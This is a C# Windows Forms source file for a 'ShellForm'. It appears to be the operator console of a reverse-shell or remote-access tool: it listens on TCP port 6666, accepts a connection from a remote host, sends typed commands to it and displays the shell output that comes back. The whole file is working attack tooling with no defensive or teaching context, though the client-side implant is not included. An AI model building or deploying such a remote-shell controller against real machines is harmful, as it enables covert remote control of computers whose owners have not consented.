using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerLibrary
{
    public partial class ShellForm : Form
    {
        private TcpListener tcpListener;
        private NetworkStream MyStream;
        private StreamWriter myStrWriter;
        private StreamReader myStrReader;
        private StringBuilder strInput;
        private Socket socketForServer;
        private Task ListenTask;
        private Task ClientTask;

        public ShellForm()
        {
            InitializeComponent();
        }

        public ShellForm(NetworkStream netStream)
        {
            this.MyStream = netStream;
            this.myStrReader = new StreamReader(this.MyStream);
            this.myStrWriter = new StreamWriter(this.MyStream);
            strInput = new StringBuilder();
            InitializeComponent();
        }

        private void ShellForm_Shown(object sender, EventArgs e)
        {
            this.ListenTask = StartListen();
            txtInput.Focus();
        }

        private async void btnSend_Click(object sender, EventArgs e)
        {
            try
            {
                await SendShellMsg(txtInput.Text.ToString(), this.myStrWriter);
                txtInput.Text = "";
            }
            catch (Exception err) { }
        }

        private async Task StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 6666);
            tcpListener.Start();
            toolStripStatusLabel1.Text = "Listening on port 6666 ...";
            for (; ; )
            {
                socketForServer = await tcpListener.AcceptSocketAsync();
                IPEndPoint ipend = (IPEndPoint)socketForServer.RemoteEndPoint;
                toolStripStatusLabel1.Text = "Connection from " +
                     IPAddress.Parse(ipend.Address.ToString());
                ClientTask = RunClient();
            }
        }

        public async Task SendShellMsg(string text, StreamWriter netWriter)
        {
            try
            {
                strInput.Append(txtInput.Text.ToString());
                await netWriter.WriteLineAsync(strInput.ToString());
                await netWriter.FlushAsync();
                strInput.Remove(0, strInput.Length);
                if (txtInput.Text == "exit") Cleanup();
                if (txtInput.Text == "terminate") Cleanup();
                if (txtInput.Text == "cls") txtOutput.Text = "";
                txtInput.Text = "";

            }
            catch (Exception err) { }
        }

        private async Task RunClient()
        {
            this.MyStream = new NetworkStream(socketForServer);
            this.myStrReader = new StreamReader(this.MyStream);
            this.myStrWriter = new StreamWriter(this.MyStream);
            strInput = new StringBuilder();
            while (true)
            {
                try
                {
                    strInput.Append(await this.myStrReader.ReadLineAsync());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);
            }
        }

        private delegate void DisplayDelegate(string message);

        private void DisplayMessage(string message)
        {
            if (txtOutput.InvokeRequired)
            {
                Invoke(new DisplayDelegate(
                    DisplayMessage), new object[] { message });
            }
            else
            {
                txtOutput.AppendText(message);
            }
        }


        private void Cleanup()
        {
            try
            {
                this.myStrReader.Close();
                this.myStrWriter.Close();
                this.MyStream.Close();
                this.socketForServer.Close();
            }
            catch (Exception err) { }
            toolStripStatusLabel1.Text = "Connection Lost";
        }

        private async void txtInput_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    await SendShellMsg(txtInput.Text.ToString(), this.myStrWriter);
                }
            }
            catch (Exception err) { }
        }   
    }
}
